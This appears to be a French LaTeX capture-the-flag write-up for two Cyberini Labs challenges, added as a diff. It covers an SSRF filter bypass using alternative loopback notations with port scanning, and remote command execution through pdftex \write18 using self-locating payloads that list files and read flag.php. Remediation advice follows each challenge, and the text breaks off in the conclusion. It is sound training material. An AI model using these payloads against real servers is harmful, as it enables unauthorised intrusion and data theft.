@@ -1,0 +1,814 @@
+\documentclass[11pt,a4paper]{article}
+
+% ============================================================
+% Mise en page
+% ============================================================
+\usepackage[margin=2.4cm]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{tcolorbox}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{amssymb}
+\usepackage{tabularx}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{booktabs}
+\tcbuselibrary{skins,breakable}
+
+% ---- Palette ----
+\definecolor{navy}{HTML}{1A3A6B}
+\definecolor{gold}{HTML}{C9970A}
+\definecolor{codebg}{HTML}{0D1117}
+\definecolor{codefg}{HTML}{E6EDF3}
+\definecolor{codegreen}{HTML}{7EE787}
+\definecolor{codegray}{HTML}{8B949E}
+\definecolor{codeorange}{HTML}{FFA657}
+\definecolor{codepink}{HTML}{FF7B72}
+\definecolor{boxwarn}{HTML}{FFF3F3}
+\definecolor{boxwarnb}{HTML}{E0A0A0}
+\definecolor{boxok}{HTML}{EAF3FB}
+\definecolor{boxokb}{HTML}{1A3A6B}
+\definecolor{boxkey}{HTML}{FEF3D6}
+\definecolor{boxkeyb}{HTML}{C9970A}
+
+% ---- Titres ----
+\titleformat{\section}
+  {\Large\bfseries\color{navy}}
+  {\thesection}{0.6em}{}[{\color{gold}\titlerule[1.2pt]}]
+\titleformat{\subsection}
+  {\large\bfseries\color{navy}}
+  {\thesubsection}{0.6em}{}
+\titlespacing*{\section}{0pt}{1.6em}{0.9em}
+\titlespacing*{\subsection}{0pt}{1.3em}{0.6em}
+
+% ---- En-tetes ----
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0.4pt}
+\fancyhead[L]{\small\color{navy}\textbf{Cyberini Labs} --- Writeup}
+\fancyhead[R]{\small\color{codegray}SSRF \& LaTeX \texttt{\textbackslash write18}}
+\fancyfoot[C]{\small\thepage}
+
+% ---- Code listings ----
+\lstdefinestyle{term}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\footnotesize\color{codefg},
+  breaklines=true,
+  breakatwhitespace=false,
+  columns=fullflexible,
+  keepspaces=true,
+  frame=single,
+  framerule=0pt,
+  rulecolor=\color{codebg},
+  framesep=8pt,
+  xleftmargin=4pt,
+  xrightmargin=4pt,
+  showstringspaces=false,
+  commentstyle=\color{codegray}\itshape,
+  keywordstyle=\color{codeorange}\bfseries,
+  stringstyle=\color{codegreen},
+  identifierstyle=\color{codefg},
+  literate=
+    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1
+    {É}{{\'E}}1 {È}{{\`E}}1 {î}{{\^i}}1 {ç}{{\c c}}1 {œ}{{\oe}}1,
+}
+\lstset{style=term}
+
+\newtcolorbox{keyinsight}[1][]{
+  colback=boxkey, colframe=boxkeyb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries, coltitle=black,
+  title={Idee cle}, #1
+}
+\newtcolorbox{deadend}[1][]{
+  colback=boxwarn, colframe=boxwarnb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries, coltitle=black,
+  title={Piste eliminee}, #1
+}
+\newtcolorbox{noteok}[1][]{
+  colback=boxok, colframe=boxokb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries\color{navy}, coltitle=navy,
+  #1
+}
+
+\hypersetup{
+  colorlinks=true, linkcolor=navy, urlcolor=navy, citecolor=navy,
+  pdftitle={Writeup : SSRF et LaTeX write18 -- Cyberini Labs},
+  pdfauthor={Assistant Claude},
+}
+
+\setlist[itemize]{leftmargin=1.4em}
+\setlist[enumerate]{leftmargin=1.6em}
+
+\begin{document}
+
+% ============================================================
+% Page de titre
+% ============================================================
+\begin{titlepage}
+\centering
+\vspace*{2.2cm}
+{\Huge\bfseries\color{navy} Deux challenges Cyberini Labs\par}
+\vspace{0.4cm}
+{\Large\color{gold} Methodologie complete de resolution\par}
+\vspace{1.6cm}
+
+{\large\bfseries\color{navy} Challenge 1 --- Apercu d'URL\par}
+{\large SSRF (Server-Side Request Forgery) et contournement de filtre IP\par}
+\vspace{0.8cm}
+{\large\bfseries\color{navy} Challenge 2 --- Convertisseur de fichiers\par}
+{\large Execution de commandes via \texttt{\textbackslash write18} (LaTeX)\par}
+
+\vspace{2.4cm}
+\begin{tcolorbox}[colback=boxok, colframe=boxokb, width=0.82\textwidth, arc=3pt, boxrule=1pt]
+\textbf{Cadre.} Deux exercices d'entrainement a la securite offensive,
+resolus sur la plateforme Cyberini Labs, dans un environnement isole et
+autorise a cet effet. Ce document reconstruit fidelement la demarche
+suivie -- y compris les impasses -- pour que la methode soit
+reutilisable, pas seulement le resultat.
+\end{tcolorbox}
+
+\vfill
+{\small\color{codegray} Document genere le \today\par}
+\end{titlepage}
+
+\tableofcontents
+\newpage
+
+% ============================================================
+% CHALLENGE 1
+% ============================================================
+\section{Challenge 1 --- Apercu d'URL (SSRF)}
+
+\subsection{Enonce et objectif}
+
+Le service propose un « apercu d'URL » : on lui donne une adresse,
+il va la chercher lui-meme et affiche un extrait du HTML recu. L'enonce
+precise qu'un panneau d'administration interne existe sur le serveur,
+\textbf{inaccessible depuis Internet}, et donne deux indices :
+
+\begin{itemize}
+  \item \textit{Indice 1} : c'est le \textbf{serveur} qui emet la requete,
+        depuis sa propre position reseau, vers un port a 4 chiffres
+        courant pour les panneaux d'admin.
+  \item \textit{Indice 2} : \texttt{127.0.0.1} et \texttt{localhost} sont
+        bloques, mais une adresse IP peut s'ecrire de bien des facons.
+\end{itemize}
+
+Ces deux indices decrivent exactement une \textbf{SSRF} : on ne va pas
+chercher a atteindre le panneau admin nous-memes (il est « inaccessible
+depuis Internet »), on va faire en sorte que le \emph{serveur
+vulnerable} le fasse a notre place, puisque lui, physiquement, est sur le
+meme reseau que ce panneau.
+
+\subsection{Reconnaissance de l'application}
+
+Premiere etape : comprendre l'interface avant de chercher a la casser.
+
+\begin{lstlisting}[language=bash]
+curl -s -i -m 15 'http://<cible>/'
+\end{lstlisting}
+
+La page renvoie un simple formulaire :
+
+\begin{lstlisting}[language=html]
+<form action="/preview" method="get">
+  <input type="text" name="url" placeholder="https://example.com" value="">
+  <button type="submit">Apercu</button>
+</form>
+\end{lstlisting}
+
+Donc le point d'entree est \texttt{GET /preview?url=<cible>}. Premier test
+de reference, avec une URL externe normale, pour voir la forme d'une
+reponse « saine » :
+
+\begin{lstlisting}[language=bash]
+curl -s 'http://<cible>/preview?url=http://example.com'
+\end{lstlisting}
+
+Le HTML d'\texttt{example.com} revient bien, integre dans un bloc
+\texttt{.preview-frame}. Le service fait donc une vraie requete HTTP
+sortante et en restitue le corps -- c'est le comportement qu'on va
+detourner.
+
+\subsection{Identification du filtre}
+
+On teste ensuite directement les deux valeurs que l'enonce dit bloquees :
+
+\begin{lstlisting}[language=bash]
+curl -s '.../preview?url=http://127.0.0.1'
+curl -s '.../preview?url=http://localhost'
+\end{lstlisting}
+
+Les deux renvoient la meme erreur :
+
+\begin{lstlisting}
+<div class="err">&#9888; Acces au reseau local interdit.</div>
+\end{lstlisting}
+
+\begin{noteok}
+\textbf{Diagnostic.} Le message est identique pour les deux valeurs : le
+filtre compare tres probablement la chaine de caracteres saisie a une
+petite liste noire (\texttt{"127.0.0.1"}, \texttt{"localhost"}), plutot
+que de resoudre reellement l'adresse et de verifier si elle appartient a
+une plage privee/loopback. C'est exactement le genre de protection que
+l'indice 2 invite a contourner.
+\end{noteok}
+
+\subsection{Pourquoi une IP peut s'ecrire de plusieurs facons}
+
+Une adresse IPv4 comme \texttt{127.0.0.1} n'est, pour le systeme
+d'exploitation et les bibliotheques reseau, qu'une maniere \emph{parmi
+d'autres} de noter le nombre entier \texttt{2\,130\,706\,433} sur 32 bits.
+Le resolveur de nom (\texttt{getaddrinfo}, utilise en coulisses par les
+bibliotheques HTTP comme \texttt{requests} en Python) accepte
+historiquement plusieurs notations heritees des toutes premieres
+implementations BSD des sockets :
+
+\begin{center}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabularx}{\textwidth}{@{}l l X@{}}
+\toprule
+\textbf{Notation} & \textbf{Exemple} & \textbf{Principe} \\
+\midrule
+Decimale pointee (normale) & \texttt{127.0.0.1} & 4 octets separes par des points \\
+Forme courte & \texttt{127.1} & Le dernier segment est interprete comme
+  les 24 bits restants ; \texttt{127.1} $\equiv$ \texttt{127.0.0.1} \\
+Octale & \texttt{0177.0.0.1} & Un segment prefixe par \texttt{0} est lu en
+  base 8 ($\texttt{0177}_8 = 127_{10}$) \\
+Hexadecimale & \texttt{0x7f.0.0.1} ou \texttt{0x7f000001} & Prefixe
+  \texttt{0x}, base 16 \\
+Decimale pure (32 bits) & \texttt{2130706433} & L'adresse entiere comme un
+  seul entier non signe \\
+IPv6 loopback & \texttt{[::1]} & Equivalent IPv6 de \texttt{127.0.0.1} \\
+IPv4 mappee en IPv6 & \texttt{[::ffff:127.0.0.1]} & Forme hybride que
+  certaines piles IPv6 acceptent \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+Un filtre qui fait un simple \texttt{if url\_contains("127.0.0.1")} ne
+reconnait \textbf{aucune} de ces formes alternatives, alors que le
+resolveur systeme, lui, les traduit toutes vers la meme adresse loopback.
+C'est exactement l'ecart exploite ici.
+
+\subsection{Contournement du filtre}
+
+Test systematique de chaque forme, en encodant l'URL pour le parametre
+GET :
+
+\begin{lstlisting}[language=bash]
+BASE='http://<cible>/preview?url='
+for target in \
+  "http://127.1" "http://0177.0.0.1" "http://0x7f.0.0.1" \
+  "http://0x7f000001" "http://2130706433" "http://017700000001" \
+  "http://127.000.000.001" "http://[::1]" ; do
+  enc=$(python3 -c "import urllib.parse,sys; \
+        print(urllib.parse.quote(sys.argv[1], safe=''))" "$target")
+  curl -s "${BASE}${enc}" | grep -oE 'Acces au reseau local interdit|<div class="err">.{0,120}'
+done
+\end{lstlisting}
+
+\textbf{Resultat} : toutes les formes numeriques (\texttt{127.1}, octal,
+hexadecimal, decimal pur) passent le filtre -- la reponse n'est plus
+« Acces au reseau local interdit » mais
+\texttt{HTTPConnectionPool(host=...): Max retries exceeded}, c'est-a-dire
+que le serveur a bien \emph{tente} la connexion, et a echoue simplement
+parce que rien n'ecoute sur le port 80 a cette adresse. Seule la forme
+litterale \texttt{[::1]} restait bloquee (le filtre reconnaissait
+visiblement cette chaine-la aussi).
+
+\begin{keyinsight}
+Le message d'erreur a change de nature : on est passe d'un refus
+applicatif (« interdit ») a un refus reseau (« connexion echouee »).
+C'est le signal que le filtre est contourne et qu'une vraie tentative de
+connexion loopback a lieu -- il ne reste plus qu'a trouver le bon port.
+\end{keyinsight}
+
+\subsection{Scan de ports depuis la position reseau du serveur}
+
+\texttt{127.1} etant valide comme contournement, on l'utilise pour
+balayer une liste de ports usuels de panneaux d'administration :
+
+\begin{lstlisting}[language=bash]
+BASE='http://<cible>/preview?url='
+for port in 8000 8001 8080 8081 8443 8888 9000 9090 9200 5000 5050 \
+            3000 4000 4040 4200 6000 7000 8008 8090 9001 1080 1099 8161; do
+  enc=$(python3 -c "import urllib.parse; \
+        print(urllib.parse.quote('http://127.1:$port', safe=''))")
+  out=$(curl -s -m 6 "${BASE}${enc}")
+  if echo "$out" | grep -q 'Max retries exceeded'; then
+    echo "port $port : ferme"
+  else
+    echo "port $port : REPONSE DIFFERENTE !"
+  fi
+done
+\end{lstlisting}
+
+Sur la vingtaine de ports testes, un seul se distingue :
+\textbf{\texttt{9000}} repond avec un contenu different -- pas d'erreur de
+connexion, mais un vrai corps de reponse.
+
+\subsection{Exploitation du panneau interne}
+
+Requete finale, cette fois pour recuperer l'integralite du contenu :
+
+\begin{lstlisting}[language=bash]
+enc=$(python3 -c "import urllib.parse; \
+      print(urllib.parse.quote('http://127.1:9000', safe=''))")
+curl -s "http://<cible>/preview?url=${enc}"
+\end{lstlisting}
+
+Le panneau interne repond :
+
+\begin{lstlisting}[language=html]
+<h1>Panneau d'administration interne</h1>
+<p>Ce service n'est accessible que depuis le serveur lui-meme (127.0.0.1).</p>
+<p>Si vous lisez ceci de l'exterieur, c'est que vous avez reussi une SSRF.</p>
+<pre>flag=s3rv3r_s1d3_r3qu3st_f0rg3ry</pre>
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
+  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
+\ttfamily s3rv3r\_s1d3\_r3qu3st\_f0rg3ry
+\end{tcolorbox}
+
+\subsection{Analyse et remediation}
+
+\begin{itemize}
+  \item \textbf{Cause racine} : validation par liste noire de chaines
+        (\texttt{"127.0.0.1"}, \texttt{"localhost"}) au lieu d'une
+        validation par \emph{resolution reelle de l'adresse}, suivie
+        d'une verification de la plage IP obtenue.
+  \item \textbf{Correction recommandee} : resoudre l'hote demande
+        (\texttt{socket.getaddrinfo}), puis rejeter explicitement toute
+        adresse appartenant a \texttt{127.0.0.0/8},
+        \texttt{10.0.0.0/8}, \texttt{172.16.0.0/12},
+        \texttt{192.168.0.0/16}, \texttt{169.254.0.0/16} (link-local /
+        metadata cloud) et \texttt{::1}/\texttt{fc00::/7} en IPv6 --
+        en utilisant une bibliotheque d'adresses IP (\texttt{ipaddress}
+        en Python) plutot qu'une comparaison de texte.
+  \item \textbf{Piege classique} : verifier l'adresse \emph{avant}
+        resolution DNS n'est pas suffisant non plus (DNS rebinding) ;
+        idealement, la connexion sortante elle-meme doit etre filtree
+        au niveau reseau (allowlist de destinations, proxy sortant
+        dedie), pas seulement au niveau applicatif.
+\end{itemize}
+
+\newpage
+% ============================================================
+% CHALLENGE 2
+% ============================================================
+\section{Challenge 2 --- Convertisseur de fichiers (LaTeX \texttt{\textbackslash write18})}
+
+\subsection{Enonce et objectif}
+
+Un site convertit un fichier LaTeX envoye par l'utilisateur en PDF.
+Deux indices :
+
+\begin{itemize}
+  \item \textit{Indice 1} : le mot \texttt{write18}.
+  \item \textit{Indice 2} : « Exemple de commande qui pourrait etre
+        utilisee par le convertisseur : \texttt{shell\_exec('.../pdftex
+        --shell-escape...')} ».
+\end{itemize}
+
+\texttt{\textbackslash write18} est une primitive TeX qui, quand le
+moteur est lance avec \texttt{--shell-escape}, execute une commande shell
+arbitraire depuis l'interieur du document. Si un serveur compile des
+fichiers LaTeX fournis par les utilisateurs avec cette option activee,
+c'est une execution de commande a distance (RCE) deguisee en fonctionnalite.
+
+\begin{keyinsight}
+\texttt{pdftex} $\neq$ \texttt{pdflatex}. \texttt{pdftex} est le moteur
+TeX \emph{brut} : il ne connait ni \texttt{\textbackslash documentclass},
+ni \texttt{\textbackslash begin\{document\}} (ce sont des macros
+\emph{LaTeX}, chargees par le \emph{format} pdflatex, pas par le moteur
+lui-meme). Ce detail, donne explicitement par l'indice 2, s'est revele
+determinant -- et je suis d'abord passe a cote.
+\end{keyinsight}
+
+\subsection{Reconnaissance de l'application}
+
+\begin{lstlisting}[language=bash]
+curl -s -i 'http://<cible>/'
+\end{lstlisting}
+
+Le formulaire :
+
+\begin{lstlisting}[language=html]
+<form method="POST" enctype="multipart/form-data">
+  <input name="source_file" id="button-file" type="file">
+  <input type="submit" name="convert" value="Convertir en PDF">
+</form>
+\end{lstlisting}
+
+Premier essai avec un document LaTeX classique et valide :
+
+\begin{lstlisting}[language=bash]
+cat > test.tex <<'EOF'
+\documentclass{article}
+\begin{document}
+Hello CTF
+\end{document}
+EOF
+curl -s -F "source_file=@test.tex" -F "convert=Convertir en PDF" \
+     'http://<cible>/index.php'
+\end{lstlisting}
+
+Reponse :
+
+\begin{lstlisting}
+<span id="results">Erreur lors du parsing du fichier, veuillez reessayer.</span>
+\end{lstlisting}
+
+C'est la que commence la partie la plus longue de ce challenge : cette
+meme erreur, mot pour mot, va revenir pour \emph{tous} les essais
+suivants pendant un bon moment. Le reste de cette section documente,
+dans l'ordre, chaque hypothese testee -- y compris celles qui se sont
+revelees fausses -- parce que la demarche d'elimination est ce qui a
+permis de trouver la bonne piste au final.
+
+\subsection{Premiere serie d'hypotheses (toutes eliminees)}
+
+\begin{deadend}
+\textbf{Hypothese : type MIME du fichier.} Le formulaire n'envoie aucun
+type explicite ; peut-etre que le serveur exige
+\texttt{text/x-tex} ou \texttt{text/plain}. Teste avec
+\texttt{curl -F "source\_file=@test.tex;type=..."} pour 5 valeurs
+differentes -- \textbf{aucune ne change le resultat}.
+\end{deadend}
+
+\begin{deadend}
+\textbf{Hypothese : en-tetes HTTP manquants.} Ajout de
+\texttt{User-Agent}, \texttt{Referer}, \texttt{Origin} realistes, au cas
+ou un contournement CSRF/anti-bot serait attendu. \textbf{Aucun effet.}
+\end{deadend}
+
+\begin{deadend}
+\textbf{Hypothese : session/cookie requis.} Recuperation d'un cookie via
+un \texttt{GET} initial avant de poster. \textbf{Le serveur n'emet meme
+pas de cookie} -- piste ecartee.
+\end{deadend}
+
+\begin{deadend}
+\textbf{Hypothese : fins de ligne CRLF requises.} Le fichier est peut-etre
+attendu au format Windows. Reencodage en \texttt{\textbackslash r\textbackslash n}. \textbf{Aucun effet.}
+\end{deadend}
+
+\begin{deadend}
+\textbf{Hypothese : contenu invalide systematiquement rejete.} Test avec
+un fichier texte totalement vide de commandes LaTeX (\texttt{"Hello
+world"} brut). \textbf{Meme erreur} -- donc le contenu, en lui-meme, ne
+semble pas etre la variable determinante.
+\end{deadend}
+
+A ce stade, un test structurant : que se passe-t-il si on envoie une
+requete \emph{sans} fichier du tout, ou avec un fichier vide ?
+
+\begin{lstlisting}[language=bash]
+# Sans fichier :
+curl -s -F "convert=Convertir en PDF" 'http://<cible>/index.php'
+# -> resultat: span VIDE, pas d'erreur
+
+# Fichier de 0 octet :
+curl -s -F "source_file=@empty.tex" -F "convert=..." '...'
+# -> meme erreur que d'habitude
+\end{lstlisting}
+
+\begin{noteok}
+\textbf{Enseignement.} L'application distingue bien « pas de fichier »
+(span vide) de « fichier recu, echec du traitement » (erreur). Le
+code cote serveur reagit donc reellement a notre requete : ce n'est pas un
+message statique. Le probleme est ailleurs dans la chaine de traitement,
+pas dans la detection de presence du fichier.
+\end{noteok}
+
+\subsection{Verification de l'hypothese « environnement casse »}
+
+A ce stade du challenge, avec plus d'une dizaine de tentatives
+identiques, l'hypothese d'un \textbf{bug d'infrastructure du cote du
+laboratoire} (binaire manquant, \texttt{PATH} incomplet pour le processus
+serveur) semblait la plus probable. Avant de s'y arreter, deux tests
+decisifs ont ete menes.
+
+\paragraph{Test de timing a l'aveugle.} Si \texttt{\textbackslash write18}
+s'execute vraiment, une commande \texttt{sleep} devrait bloquer la reponse
+HTTP d'autant :
+
+\begin{lstlisting}[language=bash]
+cat > sleep.tex <<'EOF'
+\documentclass{article}
+\begin{document}
+\immediate\write18{sleep 8}
+\end{document}
+EOF
+time curl -s -F "source_file=@sleep.tex" -F "convert=..." '...'
+# resultat : 0.587s (baseline sans write18 : 0.288s)
+\end{lstlisting}
+
+Aucun delai de 8 secondes : soit la commande ne s'execute pas du tout,
+soit elle est executee mais \emph{silencieusement ignoree} (voir plus
+loin, section~\ref{sec:restricted}).
+
+\paragraph{Test navigateur reel.} Pour ecarter tout artefact propre a
+\texttt{curl} (encodage multipart non standard, en-tetes manquants), le
+meme test a ete rejoue avec un vrai navigateur pilote via Playwright :
+
+\begin{lstlisting}
+const p = await browser.newPage();
+await p.goto('http://<cible>/');
+await p.setInputFiles('#button-file', 'test.tex');
+await p.click('#button-convert');
+const results = await p.$eval('#results', e => e.textContent.trim());
+// -> "Erreur lors du parsing du fichier, veuillez reessayer."
+\end{lstlisting}
+
+\textbf{Meme resultat exactement.} Ce test a definitivement ecarte tout
+biais lie a l'outil client : le probleme est purement cote serveur.
+
+\subsection{L'indice manque : \texttt{pdftex} n'est pas \texttt{pdflatex}}
+\label{sec:pdftex}
+
+En relisant l'indice 2 attentivement --
+\texttt{shell\_exec('.../\textbf{pdftex} --shell-escape...')} -- le nom du
+binaire est \texttt{pdftex}, pas \texttt{pdflatex}. Or tous les fichiers
+envoyes jusque-la utilisaient \texttt{\textbackslash documentclass\{article\}}
+et \texttt{\textbackslash begin\{document\}}, qui sont des macros
+\textbf{LaTeX}. Le moteur \texttt{pdftex} pur ne charge \emph{aucun}
+format LaTeX par defaut : ces commandes y sont simplement
+« undefined control sequence », ce qui provoque une erreur fatale
+\textbf{avant meme d'atteindre} la ligne \texttt{\textbackslash write18}
+si elle est placee dans le corps du document.
+
+Verification locale immediate, avec le vrai binaire \texttt{pdftex} :
+
+\begin{lstlisting}[language=bash]
+cat > plain.tex <<'EOF'
+\immediate\write18{id > pwn_local.txt}
+\bye
+EOF
+pdftex --shell-escape -interaction=nonstopmode plain.tex
+cat pwn_local.txt
+\end{lstlisting}
+
+\begin{lstlisting}
+uid=1000(xeno369) gid=1000(xeno369) groupes=...
+\end{lstlisting}
+
+\begin{keyinsight}
+En syntaxe TeX « pure » -- sans \texttt{\textbackslash documentclass},
+sans \texttt{\textbackslash begin\{document\}}, terminee par
+\texttt{\textbackslash bye} au lieu de
+\texttt{\textbackslash end\{document\}} -- \texttt{\textbackslash write18}
+fonctionne parfaitement avec \texttt{--shell-escape}. C'etait la piece qui
+manquait : le payload devait etre ecrit dans le \emph{bon dialecte}.
+\end{keyinsight}
+
+\subsection{Mode restreint vs. mode complet de \texttt{\textbackslash write18}}
+\label{sec:restricted}
+
+Un point important, verifie en local, pour comprendre le test de timing
+precedent : \textbf{sans} l'option \texttt{--shell-escape}, pdftex active
+quand meme un « \texttt{\textbackslash write18} restreint », qui
+n'autorise qu'une petite liste blanche de commandes (\texttt{bibtex},
+\texttt{makeindex}, \texttt{mpost}, \texttt{kpsewhich}, etc.). Une commande
+hors liste, comme \texttt{id} ou \texttt{sleep}, est \textbf{silencieusement
+ignoree} -- la compilation continue normalement, sans erreur visible :
+
+\begin{lstlisting}[language=bash]
+pdftex -interaction=nonstopmode restricted_test.tex
+# " restricted \write18 enabled."
+# la commande "id" ne s'execute pas, mais la compilation continue
+\end{lstlisting}
+
+Cela signifie qu'un test de timing negatif (pas de delai) ne prouve pas a
+lui seul que \texttt{\textbackslash write18} est totalement inoperant --
+il peut aussi etre actif mais restreint. Dans notre cas, l'indice 2
+mentionnant explicitement \texttt{--shell-escape} suggerait le mode
+complet ; la suite a confirme que c'etait bien le cas des que la syntaxe
+etait correcte.
+
+\subsection{L'obstacle suivant : la commande s'execute, mais on ne voit rien}
+
+Avec la syntaxe TeX pure envoyee a la vraie cible :
+
+\begin{lstlisting}[language=bash]
+cat > exploit.tex <<'EOF'
+\immediate\write18{ (id; whoami; pwd; ls -la /) > pwn.txt 2>&1 }
+\bye
+EOF
+curl -s -F "source_file=@exploit.tex" -F "convert=..." 'http://<cible>/'
+\end{lstlisting}
+
+Le message d'erreur generique persistait \textbf{encore}. Mais un detail
+important avait ete etabli plus tot : le repertoire \texttt{/uploads/}
+avait le listing Apache active, et on pouvait y consulter directement les
+fichiers \texttt{.tex} envoyes (\texttt{http://<cible>/uploads/test.tex}
+renvoyait 200). Ce repertoire est donc a la fois \textbf{ecrit par PHP}
+(via \texttt{move\_uploaded\_file}) et \textbf{servi publiquement} par
+Apache -- un candidat naturel pour recuperer une sortie de commande, a
+condition d'y ecrire au bon endroit.
+
+Premiers essais avec des chemins absolus devines
+(\texttt{/var/www/html/uploads/...}) : sans succes visible. A ce stade,
+deux causes possibles restaient ouvertes : soit le chemin devine etait
+faux, soit \texttt{\textbackslash write18} s'executait dans un repertoire
+de travail totalement different (inconnu, non servi par le web).
+
+\subsection{Le piege de \texttt{grep -r /}}
+
+Pour lever l'ambiguite sans deviner a l'aveugle, l'idee a ete de faire
+\textbf{localiser la commande elle-meme} sur le disque : placer un
+marqueur unique dans le fichier \texttt{.tex} envoye, puis utiliser
+\texttt{grep -rl} pour retrouver son propre chemin absolu sur le
+systeme de fichiers cible.
+
+Premiere tentative, en cherchant depuis la racine \texttt{/} :
+
+\begin{lstlisting}[language=bash]
+\immediate\write18{ grep -rl 'MARKER' / 2>/dev/null | head -1 ... }
+\end{lstlisting}
+
+\textbf{Cette requete n'a jamais abouti} (timeout cote client). Raison :
+une recherche recursive depuis \texttt{/} traverse \texttt{/proc}, qui
+contient des fichiers virtuels dont la lecture peut bloquer
+indefiniment (par exemple \texttt{/proc/kcore} ou certaines entrees de
+\texttt{/proc/<pid>/}). La commande shell distante restait bloquee, donc
+la reponse HTTP ne revenait jamais.
+
+\begin{deadend}
+\textbf{Correction.} Ne jamais lancer un \texttt{grep -r} ou
+\texttt{find} recursif sur \texttt{/} sans exclure explicitement les
+pseudo-systemes de fichiers (\texttt{/proc}, \texttt{/sys}, \texttt{/dev}).
+La bonne pratique est de \textbf{scoper la recherche} aux repertoires
+plausibles uniquement.
+\end{deadend}
+
+\subsection{La percee : un payload qui se localise lui-meme}
+
+Nouvelle version, avec une recherche bornee a des repertoires
+applicatifs usuels (aucun pseudo-FS) :
+
+\begin{lstlisting}[language=bash]
+cat > selflocate2.tex <<'EOF'
+% MARKER_ZQ7X9K2
+\immediate\write18{
+  loc=$(grep -rl 'MARKER_ZQ7X9K2' /var /home /opt /srv /usr/share /app /tmp 2>/dev/null | head -1);
+  d=$(dirname "$loc");
+  (echo LOC=$loc; echo DIR=$d; id; pwd;
+   echo ---LS-DIR---; ls -la "$d";
+   echo ---LS-ROOT---; ls -la /;
+   echo ---FIND-FLAG---; find /var /home /opt /srv /app -iname '*flag*' 2>/dev/null
+  ) > "$d/pwn5.txt" 2>&1
+}
+\bye
+EOF
+curl -s -F "source_file=@selflocate2.tex" -F "convert=..." 'http://<cible>/'
+\end{lstlisting}
+
+Le principe : puisque le fichier \texttt{.tex} qu'on vient d'envoyer
+contient un marqueur unique, le \texttt{grep} le retrouve forcement sur
+le disque -- \textbf{peu importe le repertoire de travail reel de
+\texttt{pdftex}}, qu'on ne connait pas et n'a plus besoin de deviner. La
+sortie est ensuite ecrite juste a cote, dans le meme dossier -- qui, on le
+sait deja, est servi par le web.
+
+\begin{lstlisting}[language=bash]
+curl -s 'http://<cible>/uploads/pwn5.txt'
+\end{lstlisting}
+
+\begin{lstlisting}
+LOC=/var/www/html/uploads/selflocate.tex
+DIR=/var/www/html/uploads
+uid=1001(user) gid=0(root) groups=0(root)
+/var/www/html
+---LS-ROOT---
+...
+---FIND-FLAG---
+/var/www/html/flag.php
+\end{lstlisting}
+
+\begin{keyinsight}
+Le repertoire reel etait bien \texttt{/var/www/html/uploads} -- une
+hypothese testee des le debut, mais jamais confirmee car la premiere
+tentative (avant la decouverte de la syntaxe TeX pure) utilisait encore
+\texttt{\textbackslash documentclass}, donc n'atteignait jamais la ligne
+\texttt{\textbackslash write18}. Les deux blocages (syntaxe et
+localisation) se sont superposes ; il fallait resoudre le premier avant
+de pouvoir seulement observer le second.
+\end{keyinsight}
+
+\subsection{Recuperation du flag}
+
+\texttt{/var/www/html/flag.php} identifie, deux voies pour le lire :
+
+\begin{lstlisting}[language=bash]
+# 1. Execution directe via HTTP (le fichier est dans le webroot) :
+curl -s 'http://<cible>/flag.php'
+# -> "Est-ce que ce fichier pourrait etre utile ?"  (le PHP s'execute, pas le flag)
+
+# 2. Lecture du CODE SOURCE brut via write18 (contourne l'execution PHP) :
+\immediate\write18{ cat /var/www/html/flag.php > /var/www/html/uploads/flagout.txt }
+\end{lstlisting}
+
+La premiere methode ne renvoie que la sortie \emph{executee} du script
+(un message anodin) : le flag est en commentaire dans le code, donc
+invisible via une requete HTTP normale. La seconde methode, en lisant le
+fichier comme du texte plutot que de l'executer, revele son contenu
+integral :
+
+\begin{lstlisting}[language=php]
+<?php
+echo "Est-ce que ce fichier pourrait etre utile ?";
+//Bravo !
+$the_flag = "{CTF_Cyberini_4LIFE}";
+?>
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
+  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
+\ttfamily CTF\_Cyberini\_4LIFE
+\end{tcolorbox}
+
+\subsection{Analyse et remediation}
+
+\begin{itemize}
+  \item \textbf{Cause racine} : compilation d'un document LaTeX fourni
+        par l'utilisateur avec \texttt{--shell-escape} actif, ce qui
+        transforme un convertisseur de documents en execution de
+        commande a distance.
+  \item \textbf{Correction recommandee} :
+    \begin{enumerate}
+      \item Ne \textbf{jamais} activer \texttt{--shell-escape} (ni le
+            mode restreint) pour de la compilation de documents
+            non fiables. Utiliser \texttt{-no-shell-escape} explicitement.
+      \item Si des commandes shell sont reellement necessaires
+            (ex.\ \texttt{epstopdf}), les executer dans un
+            \textbf{bac a sable strict} : conteneur ephemere sans acces
+            reseau, systeme de fichiers en lecture seule hors d'un
+            repertoire de travail dedie, utilisateur non privilegie,
+            quotas CPU/memoire/temps.
+      \item Ne jamais placer de secrets (flags, cles, configuration)
+            dans le \textbf{webroot} servi par Apache/Nginx --
+            meme un fichier « cache » y reste techniquement
+            accessible des qu'un chemin est devine ou trouve.
+    \end{enumerate}
+\end{itemize}
+
+\newpage
+% ============================================================
+% CONCLUSION
+% ============================================================
+\section{Conclusion --- methode transferable}
+
+Au-dela des deux flags, la vraie valeur de ces deux exercices est
+methodologique. Trois reflexes reviennent dans les deux resolutions :
+
+\begin{enumerate}
+  \item \textbf{Isoler une variable a la fois.} Face a un comportement
+        opaque (erreur generique identique partout), changer un seul
+        parametre par test -- MIME, en-tetes, contenu, syntaxe, taille --
